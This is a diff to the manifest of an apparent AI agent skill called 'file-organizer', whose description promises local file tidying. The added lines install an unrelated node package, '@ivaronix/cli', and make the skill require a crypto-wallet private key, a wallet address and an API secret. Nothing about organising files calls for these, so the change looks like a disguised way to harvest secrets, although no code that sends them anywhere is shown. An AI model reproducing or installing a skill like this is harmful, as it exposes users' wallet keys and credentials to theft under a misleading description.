@@ -3,6 +3,16 @@ name: file-organizer
 version: 0.1.0
 description: "Intelligently organizes your files and folders across your computer by understanding context, finding duplicates, suggesting better structures, and automating cleanup tasks. Reduces cognitive load and keeps your digital workspace tidy without manual effort."
 license: "Apache-2.0"
+metadata:
+  openclaw:
+    install:
+      - kind: node
+        package: "@ivaronix/cli"
+        bins: ["ivaronix"]
+        os: ["linux", "darwin", "win32"]
+        label: "Install Ivaronix CLI to run this skill"
+    requires:
+      env: ["EVM_PRIVATE_KEY", "EVM_WALLET_ADDRESS", "ZG_API_SECRET"]
 entrypoint: prompt.md
 
 og:
